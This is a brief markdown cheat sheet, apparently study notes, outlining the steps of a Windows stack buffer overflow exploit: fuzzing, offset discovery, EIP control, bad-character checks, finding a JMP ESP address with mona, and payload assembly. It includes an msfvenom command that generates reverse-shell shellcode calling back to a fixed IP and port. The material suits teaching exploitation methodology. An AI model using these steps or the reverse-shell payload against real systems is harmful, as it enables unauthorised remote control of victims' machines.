# General information

The process of discovering and exploiting a BOF requires some steps:

### 1. Use a fuzzer to get the exact Bytes to crash the app:

```python
size = 10

while (size < 200):
  buffer = "A" * size
  size += 10

```

### 2. Generate a custom script to replicate the crash:

```bash
buffer = "A" * XXXX
```

### 3. Extract exact offset with msf-pattern_create and msf-pattern_offset.

```python
msf-pattern_create -l XXX
msf-pattern_offset -l XXX -q XXX
```

### 4. Test EIP with "B" values:

```python
filler = "A" * $ExactOffset
eip = "B" * 4
offset = "C" * 20
```

### 5. Locate space for the shellcode (increasing number of C's).
### 6. Locate badchars.
### 7. Find an address to redirect the flow (JMP ESP?) that is static and doesn't contain bad chars:

```bash
!mona modules
>msf-nasm_shell
>JMP ESP
!mona find -s "\xff\xe4" -m "$MODULENAME" #Module with no security features.

If address is 0x10090c83 we should add into the code in reverse:
eip = "\x83\x0c\x09\x10"
```

### 8. Generate shellcode without badchars.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.139 LPORT=444 -f c EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x20"
```

### 9. shellcode is Encoded? Add some NOPs.

```bash
filler = "A" * $ExactOffset
eip = "\x\x\x\x"
offset = "C" * 4
nops = "\x90" * 10
shellcode = "\x\x\x\x...."
```
